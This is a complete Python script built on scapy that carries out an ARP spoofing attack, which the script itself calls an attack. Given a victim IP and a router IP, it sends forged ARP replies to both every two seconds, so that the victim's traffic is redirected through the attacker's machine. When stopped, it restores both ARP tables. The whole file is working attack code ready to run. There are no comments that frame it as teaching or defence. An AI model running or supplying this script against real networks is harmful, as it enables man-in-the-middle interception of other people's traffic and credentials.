#!/usr/bin/env python3

import sys
import time
from scapy.all import ARP, Ether, srp, send

def get_mac_address(ip):
    # Create ARP packet
    arp_request = ARP(pdst=ip)
    broadcast = Ether(dst="ff:ff:ff:ff:ff:ff")
    arp_request_broadcast = broadcast / arp_request
    
    # Send packet and receive response
    answered_list = srp(arp_request_broadcast, timeout=2, verbose=False)[0]
    if answered_list:
        return answered_list[0][1].hwsrc
    return None

def spoof_arp(target_ip, gateway_ip):
    # Get MAC addresses
    target_mac = get_mac_address(target_ip)
    gateway_mac = get_mac_address(gateway_ip)
    
    if not target_mac:
        print(f"Could not find MAC address for {target_ip}")
        return False
    
    if not gateway_mac:
        print(f"Could not find MAC address for {gateway_ip}")
        return False
    
    print(f"Target MAC: {target_mac}")
    print(f"Gateway MAC: {gateway_mac}")
    print(f"Starting ARP spoofing attack...")
    print(f"Press Ctrl+C to stop the attack")
    
    try:
        while True:
            # Tell target that we are the gateway (spoof gateway)
            packet1 = ARP(op=2, pdst=target_ip, hwdst=target_mac, 
                         psrc=gateway_ip)
            
            # Tell gateway that we are the target (spoof target)  
            packet2 = ARP(op=2, pdst=gateway_ip, hwdst=gateway_mac,
                         psrc=target_ip)
            
            # Send the spoofed packets
            send(packet1, verbose=False)
            send(packet2, verbose=False)
            
            print(f"Sent spoofed ARP packets to {target_ip} and {gateway_ip}")
            time.sleep(2)  # Send every 2 seconds
            
    except KeyboardInterrupt:
        print("\nARP spoofing stopped by user.")
        restore_arp_table(target_ip, gateway_ip, target_mac, gateway_mac)
        return True

def restore_arp_table(target_ip, gateway_ip, target_mac, gateway_mac):
    print("Restoring ARP tables...")
    
    # Restore target's ARP table
    packet1 = ARP(op=2, pdst=target_ip, hwdst=target_mac,
                 psrc=gateway_ip, hwsrc=gateway_mac)
    
    # Restore gateway's ARP table  
    packet2 = ARP(op=2, pdst=gateway_ip, hwdst=gateway_mac,
                 psrc=target_ip, hwsrc=target_mac)
    
    # Send restoration packets multiple times to ensure they're received
    for i in range(5):
        send(packet1, verbose=False)
        send(packet2, verbose=False)
        time.sleep(1)
    
    print("ARP tables restored.")

def main():
    if len(sys.argv) != 3:
        print("Usage: sudo python3 arpspoof.py <Victim_IP> <Router_IP>")
        print("Example: sudo python3 arpspoof.py 10.0.2.4 10.0.2.1")
        sys.exit(1)
    
    victim_ip = sys.argv[1]
    router_ip = sys.argv[2]
    
    print(f"Starting ARP spoofing attack")
    print(f"Victim IP: {victim_ip}")
    print(f"Router IP: {router_ip}")
    
    # Start ARP spoofing
    spoof_arp(victim_ip, router_ip)

if __name__ == "__main__":
    main()